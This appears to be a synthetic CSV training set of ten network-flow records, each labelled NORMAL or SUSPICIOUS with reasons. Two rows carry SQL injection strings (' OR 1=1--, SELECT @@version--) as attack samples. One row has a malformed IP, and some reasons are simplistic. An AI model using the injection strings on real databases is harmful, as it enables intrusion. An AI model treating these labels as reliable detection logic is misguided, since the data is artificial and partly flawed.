instruction,input,output
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.100"", ""Destination IP"": ""192.168.1.1"", ""Source Port"": 49152, ""Destination Port"": 443, ""Flow Key"": ""192.168.1.100->192.168.1.1"", ""Timestamp"": ""2024-10-24T14:30:00.123456"", ""Flow Data"": {""packets"": 12, ""bytes"": 1840, ""protocol"": ""TCP""}, ""Payload"": ""GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html\r\nConnection: keep-alive\r\n\r\n""}","{""decision"": ""NORMAL"", ""category"": ""Standard Web Traffic"", ""reasons"": [""Standard HTTP GET request"", ""Common port usage"", ""Normal packet size""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""45.33.22.11"", ""Destination IP"": ""192.168.1.100"", ""Source Port"": 31337, ""Destination Port"": 22, ""Flow Key"": ""45.33.22.11->192.168.1.100"", ""Timestamp"": ""2024-10-24T14:31:00.234567"", ""Flow Data"": {""packets"": 1000, ""bytes"": 65000, ""protocol"": ""TCP""}, ""Payload"": ""SSH-2.0-PuTTY_Release_0.70\r\n""}","{""decision"": ""SUSPICIOUS"", ""category"": ""Potential Brute Force Attack"", ""reasons"": [""High packet count"", ""Known malicious source port"", ""External IP attempting SSH access""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""10.0.0.50"", ""Destination IP"": ""10.0.0.1"", ""Source Port"": 49200, ""Destination Port"": 80, ""Flow Key"": ""10.0.0.50->10.0.0.1"", ""Timestamp"": ""2024-10-24T14:32:00.345678"", ""Flow Data"": {""packets"": 8, ""bytes"": 1200, ""protocol"": ""TCP""}, ""Payload"": ""GET /api/v1/users HTTP/1.1\r\nHost: internal-app\r\nAuthorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9\r\n\r\n""}","{""decision"": ""NORMAL"", ""category"": ""Internal API Traffic"", ""reasons"": [""Internal network communication"", ""Valid API request"", ""Proper authentication present""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.150"", ""Destination IP"": ""8.8.8.8"", ""Source Port"": 53124, ""Destination Port"": 53, ""Flow Key"": ""192.168.1.150->8.8.8.8"", ""Timestamp"": ""2024-10-24T14:34:00.567890"", ""Flow Data"": {""packets"": 2, ""bytes"": 120, ""protocol"": ""UDP""}, ""Payload"": ""Standard DNS query for example.com""}","{""decision"": ""NORMAL"", ""category"": ""DNS Query"", ""reasons"": [""Standard DNS lookup"", ""Expected packet size"", ""Known DNS server""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""103.41.177.85"", ""Destination IP"": ""192.168.1.20"", ""Source Port"": 60000, ""Destination Port"": 3389, ""Flow Key"": ""103.41.177.85->192.168.1.20"", ""Timestamp"": ""2024-10-24T14:35:00.678901"", ""Flow Data"": {""packets"": 2000, ""bytes"": 150000, ""protocol"": ""TCP""}, ""Payload"": ""03 00 00 13 0e e0 00 00 00 00 00 01 00 08 00 0b 00 00 00""}","{""decision"": ""SUSPICIOUS"", ""category"": ""Potential RDP Brute Force"", ""reasons"": [""High volume of RDP attempts"", ""External IP source"", ""Suspicious packet pattern""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.200"", ""Destination IP"": ""192.168.1.25"", ""Source Port"": 49500, ""Destination Port"": 137, ""Flow Key"": ""192.168.1.200->192.168.1.25"", ""Timestamp"": ""2024-10-24T14:36:00.789012"", ""Flow Data"": {""packets"": 4, ""bytes"": 240, ""protocol"": ""UDP""}, ""Payload"": ""Standard NetBIOS name query""}","{""decision"": ""NORMAL"", ""category"": ""NetBIOS Traffic"", ""reasons"": [""Internal network communication"", ""Standard NetBIOS query"", ""Normal packet size""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""91.224.160.108"", ""Destination IP"": ""192.168.1.30"", ""Source Port"": 56789, ""Destination Port"": 1433, ""Flow Key"": ""91.224.160.108->192.168.1.30"", ""Timestamp"": ""2024-10-24T14:37:00.890123"", ""Flow Data"": {""packets"": 150, ""bytes"": 45000, ""protocol"": ""TCP""}, ""Payload"": ""SELECT @@version--""}","{""decision"": ""SUSPICIOUS"", ""category"": ""SQL Injection Attempt"", ""reasons"": [""Known SQL injection pattern"", ""External access to SQL port"", ""Malicious payload detected""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""41.200.162.108"", ""Destination IP"": ""172.16.0 50"", ""Source Port"": 56789, ""Destination Port"": 1433, ""Flow Key"": ""41.200.162.108->172.16.0 50"", ""Timestamp"": ""2024-10-24T14:37:00.890123"", ""Flow Data"": {""packets"": 150, ""bytes"": 45000, ""protocol"": ""TCP""}, ""Payload"": ""' OR 1=1-- ""}","{""decision"": ""SUSPICIOUS"", ""category"": ""SQL Injection Attempt"", ""reasons"": [""Known SQL injection pattern"", ""External access to SQL port"", ""Malicious payload detected""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.105"", ""Destination IP"": ""192.168.1.2"", ""Source Port"": 49153, ""Destination Port"": 8080, ""Flow Key"": ""192.168.1.105->192.168.1.2"", ""Timestamp"": ""2024-10-24T14:38:00.123456"", ""Flow Data"": {""packets"": 15, ""bytes"": 2100, ""protocol"": ""TCP""}, ""Payload"": ""GET /dashboard HTTP/1.1\r\nHost: internal-dashboard\r\nCookie: session=abc123\r\nUser-Agent: Chrome/120.0.0.0\r\n\r\n""}","{""decision"": ""NORMAL"", ""category"": ""Internal Web Traffic"", ""reasons"": [""Valid internal dashboard access"", ""Standard HTTP headers"", ""Normal session cookie""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""23.145.89.156"", ""Destination IP"": ""192.168.1.40"", ""Source Port"": 44444, ""Destination Port"": 21, ""Flow Key"": ""23.145.89.156->192.168.1.40"", ""Timestamp"": ""2024-10-24T14:39:00.234567"", ""Flow Data"": {""packets"": 800, ""bytes"": 48000, ""protocol"": ""TCP""}, ""Payload"": ""USER anonymous\r\nPASS anonymous\r\n""}","{""decision"": ""SUSPICIOUS"", ""category"": ""FTP Brute Force"", ""reasons"": [""Multiple anonymous login attempts"", ""External IP accessing FTP"", ""High packet count""]}"
